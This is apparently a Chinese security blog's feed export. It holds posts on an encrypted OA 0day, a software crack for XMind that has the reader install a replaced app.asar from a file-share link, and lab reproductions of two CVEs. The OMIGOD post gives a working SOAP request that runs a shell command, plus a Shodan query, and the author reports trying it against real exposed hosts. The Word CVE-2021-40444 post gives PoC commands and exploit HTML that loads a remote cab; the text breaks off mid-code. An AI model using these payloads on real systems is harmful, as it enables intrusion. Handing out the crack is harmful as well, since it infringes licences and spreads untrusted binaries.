href="https://blog.csdn.net/lynch0571/article/details/33320551">https://blog.csdn.net/lynch0571/article/details/33320551</a></p><p><a href="https://blog.csdn.net/oLuoJinFanHua12/article/details/100655719">https://blog.csdn.net/oLuoJinFanHua12/article/details/100655719</a></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>某OA(CNVD-2021-*)漏洞</title>
    <link href="/posts/2fbbc18b.html"/>
    <url>/posts/2fbbc18b.html</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="a39774adebd0d5cb6385af5541abc21425c00de4aaf3e65faf54aae0e5866743">f45ec8ed342cc5a5e7a1892111de404ade6cd56d66bbb0f95f41be3a9c7196a5c332d00c2a007a3da54fa78b1ff142e3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>OA</tag>
      
      <tag>0day</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XMind 2021大客户版</title>
    <link href="/posts/4fc730d4.html"/>
    <url>/posts/4fc730d4.html</url>
    
    <content type="html"><![CDATA[<p>当前最新版：v11.1.0-202109232239</p><p>官方原版安装包下载地址： <a href="https://dl2.xmind.cn/XMind-for-Windows-64bit-11.1.0-202109232239.exe">https://dl2.xmind.cn/XMind-for-Windows-64bit-11.1.0-202109232239.exe</a></p><p>官方安装包备份地址：<a href="https://wws.lanzoui.com/iWqwUv716kf">https://wws.lanzoui.com/iWqwUv716kf</a> 密码:c9ri</p><p>免安装版：<a href="https://wws.lanzoui.com/iOQ7Zv7165a">https://wws.lanzoui.com/iOQ7Zv7165a</a> 密码:3d80</p><p><strong>原版安装</strong></p><p>双击安装包，默认自动安装在：<code>C:\Program Files\XMind</code>，并且会自动启动该软件，先关闭软件。</p><p><img src="https://z3.ax1x.com/2021/10/17/5tgY5t.png" alt=""></p><p>下载【app.asar】 <a href="https://wws.lanzoui.com/ikPtev6y8ba">https://wws.lanzoui.com/ikPtev6y8ba</a> 密码:1mo5</p><p>解压替换 <code>C:\Program Files\XMind\resources\app.asar</code>。</p><p>下面两方法择其一：</p><p>方法一、新建系统变量VANA_LICENSE_TO，VANA_LICENSE_MODE，直接打开XMind。</p><p><img src="https://z3.ax1x.com/2021/10/17/5tgJUI.png" alt=""></p><p>方法二、新建 如下文件两个文件保存到XMind安装目录下 <code>C:\Program Files\XMind\</code></p><p><code>XmindFull.cmd</code></p><p>VANA_LICENSE_TO 值可自定义，也就是授权给谁。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic">@echo <span class="hljs-keyword">off</span><br>set VANA_LICENSE_TO=<span class="hljs-string">&quot;Xmind Sec666&quot;</span><br>set VANA_LICENSE_MODE=true<br>start <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">&quot;%~dp0\XMind.exe&quot;</span> <span class="hljs-string">&quot;%1&quot;</span><br></code></pre></td></tr></table></figure><p><code>XMind.vbs</code></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic">CreateObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>).<span class="hljs-keyword">Run</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;C:\Program Files\XMind\XmindFull.cmd&quot;</span><span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>双击[XMind.vbs]正常启动XMind。如提示输入激活码，选择跳过即可。</p><p><img src="https://z3.ax1x.com/2021/10/17/5tgNPP.png" alt=""></p><p>创建快捷方式，XMind.vbs放到桌面，修改图标。</p><p><img src="https://z3.ax1x.com/2021/10/17/5tgU8f.png" alt=""></p><p>经测试，所有导出功能均正常(前提是打印服务处于运行状态，非运行状态使用导出功能XMind会卡死无反应)。</p><p><strong>Tips</strong></p><p>1、关闭自动更新：编辑-首选项-关闭自动更新</p><p>2、<s>通过Windows自带的防火墙(WF.msc)和火绒新建策略禁止XMind联网，原因嘛，懂的都懂，毕竟是破解难免有点啥。</s></p><p>Reference</p><p><a href="https://www.bicfic.com/xmind-2021-crack-torrent-n/">https://www.bicfic.com/xmind-2021-crack-torrent-n/</a></p>]]></content>
    
    
    <categories>
      
      <category>资源分享</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Xmind</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OMIGOD RcE</title>
    <link href="/posts/c089dc91.html"/>
    <url>/posts/c089dc91.html</url>
    
    <content type="html"><![CDATA[<p>近日国外Wiz.io团队研究人员发现了omi多个漏洞  ，其中重点是RcE（CVE-2021-38647），称之为 OMIGOD，存在漏洞版本为 1.6.8.0 及以下版本中的开放管理基础设施 (OMIagent）。</p><h3 id="本地环境">本地环境</h3><p>CentOS 7</p><p><a href="https://github.com/microsoft/omi/releases">omi v1.6.8-0</a></p><p>​<code>omi-1.6.8-0.ssl_110.ulinux.x64.deb</code></p><p>[SCXcore]<a href="https://github.com/microsoft/SCXcore/releases%EF%BC%89">https://github.com/microsoft/SCXcore/releases）</a></p><p>​<code>scx-1.6.6-0.ssl_110.universal.x64.deb</code></p><h3 id="0x01安装-omi和SCXcore">0x01安装 omi和SCXcore</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/microsoft/omi/releases/download/v1.6.8-0/omi-1.6.8-0.ssl_110.ulinux.x64.deb<br>wget https://github.com/microsoft/SCXcore/releases/download/v1.6.8-1/scx-1.6.8-1.ssl_110.ulinux.x64.deb<br>-------------------------------------------------------------------------------<br>sec@ubuntu:~/tmp$ sudo dpkg -i omi-1.6.8-0.ssl_110.ulinux.x64.deb<br>[sudo] password <span class="hljs-keyword">for</span> sec:<br>Selecting previously unselected package omi.<br>(Reading database ... 71462 files and directories currently installed.)<br>Preparing to unpack omi-1.6.8-0.ssl_110.ulinux.x64.deb ...<br>Creating omiusers group ...<br>Creating omi group ...<br>Creating omi service account ...<br>Unpacking omi (1.6.8.0) ...<br>Setting up omi (1.6.8.0) ...<br>Generating a RSA private key<br>....................+++++<br>.......+++++<br>writing new private key to <span class="hljs-string">&#x27;/etc/opt/omi/ssl/omikey.pem&#x27;</span><br>-----<br>2021-09-19 12:25:52 : Crontab not configured to update omi keytab automatically. Skip unconfigure<br>ktutil not found<br>Checking <span class="hljs-keyword">if</span> cron is installed...<br>Checking <span class="hljs-keyword">if</span> cron/crond service is started...<br>Set up a cron job to OMI logrotate every 15 minutes<br>Configuring OMI service ...<br>Created symlink /etc/systemd/system/multi-user.target.wants/omid.service → /lib/systemd/system/omid.service.<br>Trying to start omi with systemctl<br>omi is started.<br>Processing triggers <span class="hljs-keyword">for</span> systemd (245.4-4ubuntu3.11) ...<br>sec@ubuntu:~/tmp$ sudo dpkg -i scx-1.6.8-1.ssl_110.ulinux.x64.deb<br>Selecting previously unselected package scx.<br>(Reading database ... 71525 files and directories currently installed.)<br>Preparing to unpack scx-1.6.8-1.ssl_110.ulinux.x64.deb ...<br>Unpacking scx (1.6.8.1) ...<br>Setting up scx (1.6.8.1) ...<br>Generating certificate with hostname=<span class="hljs-string">&quot;ubuntu&quot;</span><br><br>WARNING!<br>Could not <span class="hljs-built_in">read</span> 256 bytes of random data from /dev/random. Will revert to less secure /dev/urandom.<br>See the security guide <span class="hljs-keyword">for</span> how to regenerate certificates at a later time when more random data might be available.<br><br>Trying to stop omi with systemctl<br>omi is stopped.<br>Trying to start omi with systemctl<br>omi is started.<br>sec@ubuntu:~/tmp$<br><br></code></pre></td></tr></table></figure><h3 id="0x02修改监听端口">0x02修改监听端口</h3><p>sudo vi /etc/opt/omi/conf/omiserver.conf</p><p><img src="https://z3.ax1x.com/2021/10/01/47p2Vg.png" alt=""></p><p>重启omi服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">sec@ubuntu:~/tmp$ sudo service omid restart<br>sec@ubuntu:~/tmp$ ss -ant<br>State    Recv-Q   Send-Q       Local Address:Port        Peer Address:Port    Process<br>LISTEN   0        128              127.0.0.1:6010             0.0.0.0:*<br>LISTEN   0        4096         127.0.0.53%lo:53               0.0.0.0:*<br>LISTEN   0        128                0.0.0.0:22               0.0.0.0:*<br>ESTAB    0        48         192.168.176.141:22         192.168.176.1:53524<br>ESTAB    0        0          192.168.176.141:22         192.168.176.1:53526<br>LISTEN   0        128                  [::1]:6010                [::]:*<br>LISTEN   0        15                       *:5986                   *:*<br>LISTEN   0        128                   [::]:22                  [::]:*<br>sec@ubuntu:~/tmp$<br></code></pre></td></tr></table></figure><h3 id="0x03-Exploit">0x03 Exploit</h3><p>请求包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">POST https://192.168.176.141:5986/wsman HTTP/1.1<br>Host: 192.168.176.141:5986<br>User-Agent: python-requests/2.25.1<br>Accept: */*<br>Connection: keep-alive<br>Content-Type: application/soap+xml;charset=UTF-8<br>Content-Length: 1645<br><br>&lt;s:Envelope xmlns:s=&quot;http://www.w3.org/2003/05/soap-envelope&quot; xmlns:a=&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing&quot; xmlns:h=&quot;http://schemas.microsoft.com/wbem/wsman/1/windows/shell&quot; xmlns:n=&quot;http://schemas.xmlsoap.org/ws/2004/09/enumeration&quot; xmlns:p=&quot;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd&quot; xmlns:w=&quot;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;<br>   &lt;s:Header&gt;<br>      &lt;a:To&gt;HTTP://192.168.1.1:5986/wsman/&lt;/a:To&gt;<br>      &lt;w:ResourceURI s:mustUnderstand=&quot;true&quot;&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&lt;/w:ResourceURI&gt;<br>      &lt;a:ReplyTo&gt;<br>         &lt;a:Address s:mustUnderstand=&quot;true&quot;&gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&lt;/a:Address&gt;<br>      &lt;/a:ReplyTo&gt;<br>      &lt;a:Action&gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand&lt;/a:Action&gt;<br>      &lt;w:MaxEnvelopeSize s:mustUnderstand=&quot;true&quot;&gt;102400&lt;/w:MaxEnvelopeSize&gt;<br>      &lt;a:MessageID&gt;uuid:0AB58087-C2C3-0005-0000-000000010000&lt;/a:MessageID&gt;<br>      &lt;w:OperationTimeout&gt;PT1M30S&lt;/w:OperationTimeout&gt;<br>      &lt;w:Locale xml:lang=&quot;en-us&quot; s:mustUnderstand=&quot;false&quot; /&gt;<br>      &lt;p:DataLocale xml:lang=&quot;en-us&quot; s:mustUnderstand=&quot;false&quot; /&gt;<br>      &lt;w:OptionSet s:mustUnderstand=&quot;true&quot; /&gt;<br>      &lt;w:SelectorSet&gt;<br>         &lt;w:Selector Name=&quot;__cimnamespace&quot;&gt;root/scx&lt;/w:Selector&gt;<br>      &lt;/w:SelectorSet&gt;<br>   &lt;/s:Header&gt;<br>   &lt;s:Body&gt;<br>      &lt;p:ExecuteShellCommand_INPUT xmlns:p=&quot;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&quot;&gt;<br>         &lt;p:command&gt;id&lt;/p:command&gt;<br>         &lt;p:timeout&gt;0&lt;/p:timeout&gt;<br>      &lt;/p:ExecuteShellCommand_INPUT&gt;<br>   &lt;/s:Body&gt;<br>&lt;/s:Envelope&gt;<br><br></code></pre></td></tr></table></figure><p>以上请求数据包放到burpsuite重发，由于证书软件bp会提示无法连接到目标。可以使用py发送请求直接rce。</p><p>​<a href="https://github.com/horizon3ai/CVE-2021-38647">https://github.com/horizon3ai/CVE-2021-38647</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">──╼ <span class="hljs-variable">$python3</span> omigod.py -h<br>usage: omigod.py [-h] -t TARGET [-c COMMAND]<br><br>optional arguments:<br>  -h, --<span class="hljs-built_in">help</span>            show this <span class="hljs-built_in">help</span> message and <span class="hljs-built_in">exit</span><br>  -t TARGET, --target TARGET<br>                        The IP address of the target<br>  -c COMMAND, --<span class="hljs-built_in">command</span> COMMAND<br>                        The <span class="hljs-built_in">command</span> to run<br></code></pre></td></tr></table></figure><p><img src="https://z3.ax1x.com/2021/10/01/47pW5j.png" alt=""></p><h3 id="shodan搜索">shodan搜索</h3><p><code>port:5986 ssl:&quot;cloudapp.net&quot;</code></p><p><img src="https://z3.ax1x.com/2021/10/01/47pRaQ.png" alt=""></p><p>看着数量是蛮大的，然而一个都没成功，不知道什么原因。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
      <tag>CVE-2021-38647</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Microsoft Office Word RCE</title>
    <link href="/posts/68f50248.html"/>
    <url>/posts/68f50248.html</url>
    
    <content type="html"><![CDATA[<p>Microsoft Office Word 远程代码执行(CVE-2021-40444)</p><h3 id="0x01-简介">0x01 简介</h3><p>  推特又又又披露了个0day，该漏洞会影响多个版本的 Windows。 此漏洞（CVE-2021-40444）目前通过恶意Office 365文档传播，需要用户输入才能打开文件才能触发。跟十年前的<a href="https://tech.qq.com/a/20100122/000124.htm">IE网马</a> 一样，IE自动安装新的插件导致的漏洞，以及office可以引用mshtml格式，导致排版引擎模板可执行。</p><h3 id="0x02-复现环境">0x02 复现环境</h3><p>parrotOS</p><p><a href="https://www.parrotsec.org/">https://www.parrotsec.org/</a></p><p>Windows 10（1903）</p><p>Office 2016增强版</p><h3 id="0x03-操作">0x03 操作</h3><p>先安装lcab</p><p><code>sudo apt install lcab</code></p><p>下载PoC ：<code>git clone https://github.com/lockedbyte/CVE-2021-40444</code></p><p>进入到poc目录执行命令生成.docx文件（默认为弹计算器）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 exploit.py generate <span class="hljs-built_in">test</span>/calc.dll http://192.168.176.139<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/06/24/pCt644f.png" alt=""></p><p>然后执行：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> exploit.<span class="hljs-keyword">py</span> host <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>把<code>out/document.docx</code> 复制到Windows10中，ProcessMonitor过滤msword.inf事件（为后续观察）。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6o8S.png" alt=""></p><p>office打开，就会先弹窗cmd窗口，然后弹出计算器。</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6RHI.png" alt=""></p><p>parrot上可以看到接收到了请求</p><p><img src="https://s1.ax1x.com/2023/06/24/pCt6hUP.png" alt=""></p><p>github公开的deob.html。</p><p><a href="https://github.com/lockedbyte/CVE-2021-40444/blob/master/srv/deob.html">https://github.com/lockedbyte/CVE-2021-40444/blob/master/srv/deob.html</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Expires&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;-1&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=11&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-keyword">function</span> <span class="hljs-title function_">garbage</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;garbage&#x27;</span>;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">            (<span class="hljs-keyword">function</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;Document&quot;</span>][<span class="hljs-string">&#x27;prototype&#x27;</span>][<span class="hljs-string">&#x27;createElement&#x27;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;document&quot;</span>], <span class="hljs-string">&#x27;iframe&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;HTMLElement&quot;</span>][<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;appendChild&quot;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;document&quot;</span>][<span class="hljs-string">&#x27;body&#x27;</span>], iframe);</span><br><span class="language-javascript">                &#125; <span class="hljs-keyword">catch</span> (_0x1ab454) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;HTMLElement&quot;</span>][<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;appendChild&quot;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;document&quot;</span>][<span class="hljs-string">&#x27;documentElement&#x27;</span>], iframe);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> htmlfile = iframe[<span class="hljs-string">&#x27;contentWindow&#x27;</span>][<span class="hljs-string">&#x27;ActiveXObject&#x27;</span>]</span><br><span class="language-javascript">                  , htmlfile2 = <span class="hljs-keyword">new</span> <span class="hljs-title function_">htmlfile</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>);</span><br><span class="language-javascript">                iframe[<span class="hljs-string">&#x27;contentDocument&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>]()[<span class="hljs-string">&#x27;close&#x27;</span>]();</span><br><span class="language-javascript">                <span class="hljs-keyword">try</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;HTMLElement&quot;</span>][<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;removeChild&quot;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;document&quot;</span>][<span class="hljs-string">&#x27;body&#x27;</span>], iframe);</span><br><span class="language-javascript">                &#125; <span class="hljs-keyword">catch</span> (_0x3b004e) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;HTMLElement&quot;</span>][<span class="hljs-string">&quot;prototype&quot;</span>][<span class="hljs-string">&quot;removeChild&quot;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;document&quot;</span>][<span class="hljs-string">&#x27;documentElement&#x27;</span>], iframe);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">                htmlfile2[<span class="hljs-string">&#x27;open&#x27;</span>]()[<span class="hljs-string">&#x27;close&#x27;</span>]();</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> htmlfile3 = <span class="hljs-keyword">new</span> htmlfile2[(<span class="hljs-string">&#x27;Script&#x27;</span>)][<span class="hljs-string">&#x27;ActiveXObject&#x27;</span>](<span class="hljs-string">&#x27;htmlfile&#x27;</span>);</span><br><span class="language-javascript">                htmlfile3[<span class="hljs-string">&#x27;open&#x27;</span>]()[<span class="hljs-string">&#x27;close&#x27;</span>]();</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> htmlfile4 = <span class="hljs-keyword">new</span> htmlfile3[(<span class="hljs-string">&#x27;Script&#x27;</span>)][<span class="hljs-string">&#x27;ActiveXObject&#x27;</span>](<span class="hljs-string">&#x27;htmlfile&#x27;</span>);</span><br><span class="language-javascript">                htmlfile4[<span class="hljs-string">&#x27;open&#x27;</span>]()[<span class="hljs-string">&#x27;close&#x27;</span>]();</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> htmlfile5 = <span class="hljs-keyword">new</span> htmlfile4[(<span class="hljs-string">&#x27;Script&#x27;</span>)][<span class="hljs-string">&#x27;ActiveXObject&#x27;</span>](<span class="hljs-string">&#x27;htmlfile&#x27;</span>);</span><br><span class="language-javascript">                htmlfile5[<span class="hljs-string">&#x27;open&#x27;</span>]()[<span class="hljs-string">&#x27;close&#x27;</span>]();</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> <span class="hljs-title class_">ActiveXObjectVAR</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>)</span><br><span class="language-javascript">                  , <span class="hljs-title class_">ActiveXObjectVAR2</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>)</span><br><span class="language-javascript">                  , <span class="hljs-title class_">ActiveXObjectVAR3</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>)</span><br><span class="language-javascript">                  , <span class="hljs-title class_">ActiveXObjectVAR4</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>)</span><br><span class="language-javascript">                  , <span class="hljs-title class_">ActiveXObjectVAR5</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>)</span><br><span class="language-javascript">                  , <span class="hljs-title class_">ActiveXObjectVAR6</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">&#x27;htmlfile&#x27;</span>)</span><br><span class="language-javascript">                  , <span class="hljs-title class_">XMLHttpR</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">window</span>[<span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>]()</span><br><span class="language-javascript">                  , <span class="hljs-title class_">XMLHttpRopen</span> = <span class="hljs-variable language_">window</span>[<span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>][<span class="hljs-string">&#x27;prototype&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>]</span><br><span class="language-javascript">                  , <span class="hljs-title class_">XMLHttpRsend</span> = <span class="hljs-variable language_">window</span>[<span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>][<span class="hljs-string">&#x27;prototype&#x27;</span>][<span class="hljs-string">&#x27;send&#x27;</span>];</span><br><span class="language-javascript">                <span class="hljs-title class_">XMLHttpRopen</span>[<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-title class_">XMLHttpR</span>, <span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;http://127.0.0.1/test.cab&#x27;</span>, ![]),</span><br><span class="language-javascript">                <span class="hljs-title class_">XMLHttpRsend</span>[<span class="hljs-string">&#x27;call&#x27;</span>](<span class="hljs-title class_">XMLHttpR</span>),</span><br><span class="language-javascript">                htmlfile5[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;document&#x27;</span>][<span class="hljs-string">&#x27;write&#x27;</span>](<span class="hljs-string">&#x27;body&gt;&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-keyword">var</span> htmlScript = <span class="hljs-variable language_">window</span>[<span class="hljs-string">&quot;Document&quot;</span>][<span class="hljs-string">&#x27;prototype&#x27;</span>][<span class="hljs-string">&#x27;createElement&#x27;</span>][<span class="hljs-string">&#x27;call&#x27;</span>](htmlfile5[<span class="hljs-string">&#x27;Script&#x27;</span>][<span class="hljs-string">&#x27;document&#x27;</span>], <span class="hljs-string">&#x27;object&#x27;</span>);</span><br><span class="language-javascript">                htmlScript[<span class="hljs-string">&#x27;setAttribute&#x27;</span>](<span class="hljs-string">&#x27;codebase&#x27;</span>, <span class="hljs-string">&#x27;http://127.0.0.1/test.cab#version=5,0,0,0&#x27;</span>);</span><br><span class="language-javascript">                <span class="hljs-comment">// 指定CLSID，office 2016之后的才有。</span></span><br><span class="language-javascript">                htmlScript[<span class="hljs-string">&#x27;setAttribute&#x27;</span>](<span 